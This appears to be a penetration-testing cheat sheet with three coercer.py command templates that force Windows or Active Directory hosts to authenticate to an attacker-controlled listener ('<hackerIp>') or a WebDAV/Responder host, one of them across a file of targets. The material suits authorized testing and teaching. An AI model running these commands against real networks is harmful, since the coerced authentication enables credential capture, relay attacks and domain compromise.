# coercer

% adcs, certificate, windows, Active directory, template

## coercer - list vulns
#plateform/linux #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> 
```

## coercer - Webdav
#plateform/linux #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp> 
```

## coercer - List vulns many targets
#plateform/linux #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
```